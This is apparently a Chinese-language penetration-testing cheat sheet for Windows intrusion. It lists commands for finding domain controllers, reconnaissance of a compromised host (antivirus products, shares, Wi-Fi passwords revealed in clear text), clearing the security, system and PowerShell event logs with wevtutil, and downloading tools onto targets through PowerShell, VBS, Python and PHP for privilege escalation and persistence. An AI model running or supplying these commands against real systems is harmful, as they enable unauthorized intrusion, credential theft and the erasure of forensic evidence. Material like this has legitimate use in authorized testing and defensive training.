# 查找域控的方法

1.net view
```
net view /domain
```
2.set log
```
set log
```
3.通过srv记录
```
nslookup -type=SRV _ldap._tcp.corp
```
4.使用nltest
```
nltest /dclist:corp
```
5.使用dsquery
```
DsQuery Server -domain corp
```
6.使用netdom
```
netdom query pdc
```
这些都是win系统自带的命令，有的时候win版本不同，有的命令会不存在，所以多一种方法，多一种成功的可能性，实际渗透，自行根据目标环境变换

# 命令行下收集主机方法

使用wmic识别安装到系统中的补丁情况
```
C:\> wmic qfe get description,installedOn
```
使用wmic获取杀毒软件信息
```
C:\> wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
```
识别正在运行的服务
```
C:\> sc query type= service
C:\> net start
```
识别开机启动的程序，包括路径
```
C:\> wmic startup list full
```
ping探测存活主机
```
C:\> for /L %I in (100,1,254) DO @ping -w 1 -n 1 10.18.180.%I | findstr "TTL=" >> pinglive.txt
```
查看系统中网卡的IP地址和MAC地址
```
C:\> wmic nicconfig get ipaddress,macaddress
```
查看当前系统是否有屏保保护，延迟是多少
```
C:\> wmic desktop get screensaversecure,screensavertimeout
```
查看系统中开放的共享
```
C:\> wmic share get name,path
C:\> net share
```
查看系统中开启的日志
```
C:\> wmic nteventlog get path,filename,writeable
```
清除相关的日志（这里是全部清除）
```
C:\> wevtutil cl "windows powershell"
C:\> wevtutil cl "security"
C:\> wevtutil cl "system"
```
查看系统中安装的软件以及版本
```
C:\> wmic product get name,version
```
查看某个进程的详细信息 （路径，命令行参数等）
```
C:\> wmic process where name="chrome.exe" list full
```
终止一个进程
```
C:\> wmic process where name="xshell.exe" call terminate
C:\> ntsd -c q -p 进程的PID
```
显示系统中的曾经连接过的无线密码
```
C:\> netsh wlan show profiles 
C:\> netsh wlan show profiles name="profiles的名字" key=clear
```
查看当前系统是否是VMWARE
```
C:\> wmic bios list full | find /i "vmware"
```

# 下载文件的15种方法

参考:
https://www.netspi.com/blog/entryid/231/15-ways-to-download-a-file

在我们的入侵过程中，通常会需要向目标主机传送一些文件，来达到提权，维持控制等目的。这篇blog列举了15种下载文件的方法。

当然还有许多其它的办法来上传文件，下面的列表是15个我比较喜欢使用的技巧。
## PowerShell File Download
PowerShell 是一种winodws原生的脚本语言，对于熟练使用它的人来说，可以实现很多复杂的功能。

在windows 2003之中默认支持这种脚本。

下面这两条指令实现了从Internet网络下载一个文件。
```
$p = New-Object System.Net.WebClient
$p.DownloadFile("http://domain/file" "C:\%homepath%\file")
```

下面这条指令是执行一个文件
```
PS C:\> .\test.ps1
```

有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。
```
C:\>powershell set-executionpolicy unrestricted
```

## Visual Basic File Download
在1998年Visual Basic最终标准在windows上确定。下面的代码可以实现下载文件，虽然它的长度比Powershell长多了。
```
Set args = Wscript.Arguments
Url = "http://domain/file"
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", Url, False
xHttp.Send
with bStrm
    .type = 1 '
    .open
    .write xHttp.responseBody
    .savetofile " C:\%homepath%\file", 2 '
end with
```

在windows中Cscript指令可以允许你执行VBS脚本文件或者对script脚本做一些设置。在windows 7中这个指令并不是必须要用到。 但是在windows XP中需要使用这条指令，如下所示。
```
C:>cscript test.vbs
```



以下四种语言都不是系统原生脚本，但是如果你的目标机器安装了这些语言，你就可以使用他们来下载文件。
## Python File Download
Python也是很受欢迎的主流脚本语言，代码清晰且简洁。
```
#!/usr/bin/python
import urllib2
u = urllib2.urlopen('http://domain/file')
localFile = open('local_file', 'w')
localFile.write(u.read())
localFile.close()
```

## PHP File Download
PHP作为一种服务端脚本，也可以实现下载文件这种功能。
```
<?php
        $data = @file("http://example.com/file");
        $lf = "local_file";
        $fh = fopen($lf, 'w');
        fwrite($fh, $data[0]);
        fclose($fh);
?>
```

